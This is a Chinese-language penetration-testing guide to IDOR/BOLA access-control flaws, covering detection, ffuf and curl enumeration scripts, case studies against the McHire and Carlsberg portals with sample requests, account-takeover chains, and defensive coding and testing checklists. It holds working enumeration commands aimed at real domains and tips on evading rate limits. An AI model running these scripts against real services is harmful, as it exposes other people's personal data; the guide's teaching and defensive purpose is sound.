---
attack_surface: [认证/授权绕过, 信息泄露]
impact: [权限提升, 机密性破坏, 身份伪造, 信息泄露]
risk_level: 严重
prerequisites:
  - HTTP 协议基础与 API 交互理解
  - Burp Suite 拦截代理操作
  - 基础脚本编写能力 (bash/Python)
related_techniques:
  - broken-access-control
  - mass-assignment
  - jwt-attacks
  - api-security-testing
  - graphql-attacks
difficulty: 初级
tools:
  - Burp Suite + Autorize 插件
  - ffuf
  - OWASP ZAP (Auth Matrix)
---

# IDOR — 非安全直接对象引用攻击全指南

> 关联文档：[Broken Access Control](../) · [Mass Assignment](../../User%20input/Structured%20objects/Mass%20Assignment/README.md) · [JWT Attacks](../../External%20Identity%20Management/JWT%20Attacks/README.md) · [API Security Testing](../../APIs%20Buckets%20Integrations/README.md)

---

# 0x01 IDOR 原理与攻击面概览

## 1.0 TL;DR

Insecure Direct Object Reference (IDOR)，又称 Broken Object Level Authorization (BOLA)，是 Web 应用中最常见也最容易被低估的访问控制漏洞。**根本原因不是"ID 可被猜测"——而是服务端在解析用户提供的对象引用后，直接访问内部对象而不验证请求者是否被授权。** 攻击者只需替换 URL、参数或请求体中的对象标识符，即可读取、修改或删除其他用户的数据。

与 SQL 注入、XSS 不同，IDOR 不依赖任何特殊 Payload 语法——它利用的是**缺失的授权检查**。一个正确的 IDOR 测试请求与正常请求的唯一区别是：`?id=42` 变成了 `?id=41`。

## 1.1 IDOR 根本原理

IDOR 的发生链：

```
用户请求到达服务端
  ↓
服务端从请求中提取对象标识符（id=42）
  ↓
服务端直接查询数据库: SELECT * FROM orders WHERE id=42
  ↓
❌ 缺少: WHERE user_id = session.user_id
  ↓
返回数据给请求者 —— 无论请求者是否为数据所有者
```

关键事实：**JWT / Session Cookie / API Key 存在 ≠ 授权检查已完成。** 认证回答了"你是谁"，授权回答了"你能访问什么"——IDOR 是授权缺失的直接体现。

## 1.2 IDOR vs BOLA vs BAC — 术语辨析

| 术语 | 全称 | 范围 | 关系 |
|------|------|------|------|
| **IDOR** | Insecure Direct Object Reference | 通过用户可控标识符**直接**引用内部对象 | BOLA 的子集——强调"直接引用" |
| **BOLA** | Broken Object Level Authorization | 对象级别的授权检查缺失（不限于直接引用） | IDOR 的超集——涵盖所有对象级授权失败 |
| **BFLA** | Broken Function Level Authorization | 功能级别的授权缺失（如普通用户访问 `/admin`） | 与 IDOR 平行——关注功能而非数据对象 |
| **BAC** | Broken Access Control | 所有访问控制缺陷的总称 | OWASP Top 10 A01 类别 |

在实战中，IDOR 和 BOLA 常互换使用。本文档聚焦 IDOR——因直接对象引用导致的授权绕过。

## 1.3 IDOR 攻击面模型

对象引用可以出现在请求的任何位置：

| 位置 | 示例 | 常见场景 |
|------|------|----------|
| URL Path | `/api/user/1234/profile` | RESTful API |
| URL Query | `?invoice_id=2024-00001` | Web 表单 / 报表导出 |
| Request Body (JSON) | `{"user_id": 321, "order_id": 987}` | JSON API / GraphQL |
| Request Body (Form) | `user_id=321&action=delete` | 传统 Web 应用 |
| HTTP Header | `X-User-Id: 4711`, `X-Client-Id: 42` | 微服务 / API Gateway |
| Cookie | `uid=1001`, `account=12345` | 遗留系统 |

> 核心原则：**只要请求中包含一个指向内部对象的标识符，且服务端信任该标识符来自合法用户——就存在 IDOR 的潜在攻击面。**

---

# 0x02 IDOR 识别与检测

## 2.1 对象引用参数识别

识别潜在 IDOR 的第一步是**在所有请求中定位可能引用对象的参数**：

**Path 参数**：
```
/api/user/1234          ← 用户 ID
/files/550e8400-e29b... ← UUID 文件 ID
/orders/2024-00001      ← 订单号
```

**Query 参数**：
```
?id=42
?invoice=2024-00001
?file=report.pdf&user=admin
```

**Body / JSON**：
```json
{"user_id": 321, "order_id": 987, "group_id": "G-005"}
```

**Headers / Cookies**：
```
X-Client-ID: 4711
X-User-ID: 1001
Cookie: account_id=42
```

**优先级策略**：
1. 优先测试 **读取/更新** 操作端点（GET、PUT、PATCH）——利用成功即获数据
2. 其次测试 **删除** 操作（DELETE）——注意破坏性
3. 最后测试 **创建** 操作（POST）——检查是否能以他人身份或写入他人资源

## 2.2 可预测性与枚举空间

对象标识符的**可预测性**直接决定了 IDOR 的利用速度和危害：

| ID 类型 | 示例 | 枚举难度 | 风险 |
|---------|------|---------|------|
| 自增整数 | `1, 2, 3, ...` | 极低 — curl/ffuf 循环即可 | **严重** — 全量数据可被遍历 |
| 短顺序号 | `C-285-100` | 低 — 有限搜索空间 | **高** — IDs 空间通常 ≤ 10⁷ |
| UUID v1 | `550e8400-e29b-11d4-...` | 中 — 时间戳部分可预测 | **中** — 需了解生成时间窗口 |
| UUID v4 | `a4e7f2c1-...` | 高 — 随机 122 位 | **低** — 需通过其他方式泄露 |
| 编码 ID | Base64(`user:42:order:100`) | 取决于原文 | 取决于原文——编码 ≠ 熵 |

**判断 ID 类型的技巧**：
- 保存两次资源 → ID 差值的分布是否均匀 → 均匀 = 随机 UUID，有规律 = 序列
- 解码 Base64/Hex → 查看明文是否含可预测模式
- 注册多个账户 → 观察用户 ID 的分配规律

## 2.3 手动测试流程

```
1. 使用低权限账户 A 登录并正常使用应用
2. 记录账户 A 创建/拥有的资源 ID
3. 创建账户 B，获取账户 B 的资源 ID
4. 将账户 A 的请求中的资源 ID 替换为账户 B 的资源 ID
5. 使用账户 A 的 Session/Cookie/Token 发送修改后的请求
6. 观察响应：
   - 返回账户 B 的数据 → IDOR 已验证 ✓
   - 返回 403 Forbidden → 授权检查存在（仍可尝试绕过）
   - 返回 404 Not Found → 可能 ID 不存在，或资源路由隔离
   - 返回空数组/空对象 → 可能是"静默过滤"（需进一步验证）
```

```http
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```

> **关键测试原则**：改变**只有**对象标识符，保持其他所有参数不变（包括 Session Token）。如果响应返回了不同用户的数据，授权检查不存在或存在缺陷。

---

# 0x03 自动化 IDOR 枚举技术

## 3.1 序列 ID 批量枚举

当 ID 为连续整数时，用 curl 循环或 ffuf 进行批量枚举：

```bash
# curl 循环 — 适合小范围测试
for id in $(seq 64185742 64185700); do
  curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
       -H 'Content-Type: application/json' \
       -H "Cookie: auth=$TOKEN" \
       -d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id"
done
```

```bash
# ffuf — 适合更大范围的枚举
ffuf -u http://file.era.htb/download.php?id=FUZZ \
  -H "Cookie: PHPSESSID=<session>" \
  -w <(seq 0 6000) \
  -fr 'File Not Found' \
  -o hits.json

# 提取存活 ID
jq -r '.results[].url' hits.json
```

**ffuf 关键参数**：
- `-fr`：过滤假阳性（如 404 模板），只保留真正的数据响应
- `-ac`：自动过滤重复/无关响应（校准模式）
- `-o hits.json -of json`：结构化输出，便于后处理
- `-t`：并发线程数（默认 40，可调高但注意速率限制）

## 3.2 组合 ID 空间枚举

部分端点接受**多个对象 ID**（如聊天线程需要两个用户 ID）。如果应用只检查"是否已登录"而不检查"是否属于该对话"，则可同时枚举两个维度：

```bash
ffuf -u 'http://target/chat.php?chat_users[0]=NUM1&chat_users[1]=NUM2' \
  -w <(seq 1 62):NUM1 -w <(seq 1 62):NUM2 \
  -H 'Cookie: PHPSESSID=<session>' \
  -ac -o chats.json -of json
```

去重处理（消除 A,B vs B,A 对称重复）：

```bash
jq -r '.results[] | select((.input.NUM1|tonumber) < (.input.NUM2|tonumber)) | .url' chats.json
```

## 3.3 错误响应 Oracle — 用户/文件枚举

当端点接受用户名 + 文件名组合时，不同错误消息差异构成 Oracle：

```
GET /view.php?username=<user>&file=<file>

响应差异:
  - 用户名不存在 → "User not found"
  - 用户名存在 + 文件不匹配 → "File does not exist"（可能列出可用文件）
  - 用户存在 + 扩展名不合法 → validation error
```

利用 Oracle 枚举有效用户：

```bash
ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
  -b 'PHPSESSID=<session-cookie>' \
  -w /opt/SecLists/Usernames/Names/names.txt \
  -fr 'User not found'
```

一旦获得有效用户名，直接请求该用户的已知文件：

```
/view.php?username=amanda&file=privacy.odt
/view.php?username=amanda&file=passport_scan.pdf
```

这种模式在文件托管、HR 系统、医疗门户中极其常见——"你只能看到分配给你的文件"的假设仅靠隐藏文件名来实现，而非按会话所有权过滤。

---

# 0x04 真实案例研究

## 4.1 案例一：McHire Chatbot — 6400 万 PII 泄露 (2025)

**目标**：Paradox.ai 驱动的 McHire 招聘门户

**端点**：`PUT /api/lead/cem-xhr`

**漏洞**：
- `lead_id` 为 8 位连续数字（范围 1 ~ 64,185,742）
- 任意餐厅测试账户的 Session Cookie 可访问任意 `lead_id`
- 默认管理员凭据 `123456:123456` 可直接获取测试账户

**暴露数据**：
- 完整 PII：姓名、电子邮件、电话号码、地址、工作偏好
- 消费者 JWT —— 可用于会话劫持
- 影响范围：约 6400 万条申请人记录

**根因**：API 层完全信任客户端提供的 `lead_id`，后端查询 `SELECT * FROM leads WHERE id = :lead_id` 无 `WHERE tenant_id = :current_tenant_id` 条件。

```bash
curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
     -H 'Content-Type: application/json' \
     -d '{"lead_id":64185741}'
```

> **教训**：多租户 SaaS 中，对象级授权必须是 `WHERE id = X AND tenant_id = session.tenant` 而非仅 `WHERE id = X`。一个缺失的 AND 子句 = 所有租户间数据互通。

## 4.2 案例二：Wristband QR Codes — 编码 ≠ 熵 (2025-2026)

**目标**：Home of Carlsberg 展览 — 访客腕带 QR 码

**流程**：
1. 访客收到腕带，上面印有 QR 码（如 `C-285-100`）
2. 扫描 QR 打开 `https://homeofcarlsberg.com/memories/` 
3. 前端将腕带 ID 做 ASCII→Hex 编码 → `432d3238352d313030`
4. 调用 `cloudfunctions.net` 后端获取关联媒体（照片/视频 + 姓名）

**漏洞**：
- **无会话绑定**：知道 ID = 授权，无需登录
- **编码不增熵**：Hex 编码是可逆的——编码前的 ID 空间约 26M（`[A-Z]-###-###`），编码后仍是 26M
- **无有效速率限制**：实测 ~139 req/s，全量 26M 仅需约 52 小时

**利用（Burp Intruder）**：
1. **Payload 生成**：Pitchfork/Cluster Bomb 模式，位置 = 字母位 + 数字位
2. **编码规则**：ASCII→Hex Payload Processing Rule（`C-285-100` → `432d3238352d313030`）
3. **响应标记**：Grep-match 媒体 URL/JSON 字段标识有效响应
4. **实测**：2 小时内测试 ~100 万 ID，命中 ~500 有效腕带（全名 + 视频）

**Python 等价实现**：

```python
import requests

def to_hex(s):
    return ''.join(f"{ord(c):02x}" for c in s)

for band_id in ["C-285-100", "T-544-492"]:
    hex_id = to_hex(band_id)
    r = requests.get("https://homeofcarlsberg.com/memories/api", params={"id": hex_id})
    if r.ok and "media" in r.text:
        print(band_id, "->", r.json())
```

> **教训**：编码（Base64 / Hex / XOR）≠ 加密。短 ID 即使经过编码仍然是短 ID——攻击者只需对候选空间执行相同的编码算法即可恢复枚举能力。**无熵增加 + 无会话绑定 + 无速率限制 = 完美的 IDOR 温床。**

---

# 0x05 IDOR 影响与利用链

## 5.1 水平越权 → 垂直越权

IDOR 通常从**水平越权**开始（访问同级别其他用户的数据），但可以升级为**垂直越权**：

1. 通过 IDOR 读取管理员用户的 `user_id` 列表中的 admin 账户数据
2. 在 admin 数据中发现明文凭据、API Token、或密码重置链接
3. 使用 admin 凭据登录 → 完整系统控制权

或者更直接的路径：某些应用中，`role` 字段本身就是可修改的对象属性。如果在 `PUT /api/user/42` 中修改 `{"role": "admin"}` 而服务端未校验权限，则直接提权。

## 5.2 IDOR → ATO 串联路径

| 路径 | 步骤 | 实际案例 |
|------|------|---------|
| IDOR 读 Token → ATO | 1. IDOR 读取用户 A 的 JWT/API Key<br>2. 使用该 Token 冒充用户 A | McHire 案例 |
| IDOR 改密码 → ATO | 1. IDOR 访问 `PUT /api/user/42/reset-password`<br>2. 设置 `new_password` 为攻击者已知值<br>3. 登录为用户 42 | 常见于"忘记密码"端点 |
| IDOR 改邮箱 → ATO | 1. IDOR 将用户 42 的邮箱改为攻击者邮箱<br>2. 触发密码重置 → 重置链接发送到攻击者邮箱 | 邮件验证缺失场景 |
| IDOR 泄露 OTP → ATO | 1. IDOR 读取用户 42 的 2FA seed / 备份码<br>2. 生成有效 OTP 绕过 2FA | 2FA 密钥存储端点无授权检查 |

## 5.3 大规模数据泄露

当 IDOR 结合**可预测 ID** 且**无速率限制**时，可导致全量数据泄露：

```
条件:
  ✓ 自增/序列 ID
  ✓ 认证后即可遍历（无 per-object ACL）
  ✓ 无请求频率限制
  ✓ 单次请求返回完整记录（非摘要）

结果:
  总数据量 = 记录数 × 单记录大小
  枚举时间 = ID 空间 / 请求速率

  McHire: 64M 记录, 实际枚举可达任意深度
  Carlsberg: 26M 密钥空间, 实测 52 小时可遍历
```

---

# 0x06 工具链

## 6.1 浏览器/代理插件

| 工具 | 用途 | 关键特性 |
|------|------|---------|
| **Autorize** (Burp) | 自动重放请求并对比低/高权限响应 | 自动替换 Cookie，标记差异响应 |
| **Auth Matrix** (ZAP) | 多用户权限矩阵测试 | 定义角色+用户+端点，自动矩阵测试 |
| **Auto Repeater** (Burp) | 自动重复指定参数的请求 | 适合参数化 ID 测试 |
| **Turbo Intruder** (Burp) | 高速并发枚举 | 比标准 Intruder 快 10-100 倍 |

## 6.2 CLI 工具与脚本

| 工具 | 适用场景 | 示例命令 |
|------|---------|---------|
| **ffuf** | 通用 Web fuzzing，支持多参数组合 | `ffuf -u URL -w wordlist -H "Cookie: ..."` |
| **curl + jq** | 快速验证、轻量循环 | `for id in $(seq 1 100); do curl ...; done` |
| **Blindy** (GitHub) | 盲 IDOR 检测（基于时间差） | 适用于无可见数据返回的端点 |
| **bwapp-idor-scanner** (GitHub) | 专用 IDOR 自动化 | 预配置的 IDOR 测试模式 |

---

# 0x07 防御策略与安全测试清单

## 7.1 服务端对象级授权 — 核心防御

IDOR 的**唯一有效防御**是在每次数据访问前执行服务端对象级授权——且这个检查不能仅靠前端隐藏或引用混淆。

```
# 错误（仅按 ID 查询 — IDOR 可被利用）
SELECT * FROM orders WHERE id = :request_id

# 正确（按 ID + 用户所有权联合查询）
SELECT * FROM orders WHERE id = :request_id AND user_id = :session_user_id
```

**防御架构**：
1. **集中授权中间件**：所有端点统一过授权检查，不在每个 Controller 中分散实现
2. **拒绝默认**：默认拒绝访问，仅显式声明的授权规则可通过
3. **不信任客户端提供的任何对象引用**：在服务器端将用户会话映射到其有权访问的对象集合
4. **使用间接引用映射**：`/api/order/42` → `/api/order/a8f3c9e1`（服务端维护映射表）

## 7.2 标识符设计

| 策略 | 有效性 | 说明 |
|------|--------|------|
| UUID v4 | 降低枚举风险 | 122 位随机——几乎不可预测，但**不能替代授权检查** |
| UUID v7 | 优于 v1 但不完美 | 时间排序 + 随机——仍可被侧信道推断 |
| 自增 ID + 强授权 | ✅ 正确方案 | 自增 ID 本身不是问题——缺少授权才是 |
| HMAC 签名 ID | 防篡改而非防 IDOR | 签名 ID 可以防止篡改，但不能防止"使用自己签名的 ID 访问他人资源" |
| Base64/Hex 编码 | ❌ 无效 | 编码 ≠ 安全。参见 Carlsberg 案例 |

> **关键原则**：不可预测的 ID（UUID）是**纵深防御的一层**，不能替代授权检查。仅依赖 UUID 作为"安全"措施 = Security Through Obscurity。

## 7.3 监控与检测

1. **速率限制**：对同一端点、不同对象 ID 的连续请求限速
2. **异常检测**：监控用户会话中 ID 跳跃模式（正常用户按 1, 5, 2000, 47000 大幅跳跃访问对象）
3. **审计日志**：记录每次对象访问的 `(user_id, object_id, timestamp, action)` 四元组
4. **变更告警**：对"一个用户访问了 > N 个不同对象 ID/分钟"触发告警

## 7.4 IDOR 安全测试清单

**发现阶段**：
- [ ] 已识别应用中所有接受对象标识符的端点（URL Params / Body / Headers）
- [ ] 已记录每个端点的对象 ID 类型（自增/UUID/编码）
- [ ] 已确定每个端点的 ID 是否可预测
- [ ] 已识别所有"隐藏"API（移动端/旧版/内部端点中的额外参数）

**测试阶段**：
- [ ] 已使用两个不同权限账户验证每个端点（替换 ID，保持 Session）
- [ ] 已测试所有 HTTP 方法（GET/PUT/PATCH/DELETE/POST）对同一 ID 的效果
- [ ] 已测试批量操作端点（数组 ID、批量更新）的授权
- [ ] 已测试组合 ID 场景（多个对象 ID 同时出现时）
- [ ] 已对序列 ID 执行自动化枚举（至少测试一个序列范围）
- [ ] 已检查错误响应的信息泄露（不同权限返回不同错误消息？）

**进阶验证**：
- [ ] 已测试通过 IDOR 读取到 JWT/Session Token 后的重放
- [ ] 已测试 IDOR 导致的角色/权限信息写入
- [ ] 已测试"软删除"记录的 IDOR 恢复（`GET /api/user/42?include_deleted=true`）
- [ ] 已验证速率限制的 IDOR 枚举有效性（修改 User-Agent / 切换 IP / 多 Session）

---

## 参考资料

- [McHire Chatbot: Default Credentials and IDOR Expose 64M Applicants' PII](https://ian.sh/mcdonalds)
- [OWASP Top 10 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [How to Find More IDORs — Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
- [HTB Nocturnal: IDOR Oracle → File Theft](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [0xdf — HTB Era: Predictable Download IDs → Backups and Signing Keys](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf — HTB Guardian](https://0xdf.gitlab.io/2026/02/28/htb-guardian.html)
- [Carlsberg Memories Wristband IDOR — Predictable QR IDs + Intruder Brute Force (2026)](https://www.pentestpartners.com/security-blog/carlsberg-probably-not-the-best-cybersecurity-in-the-world/)
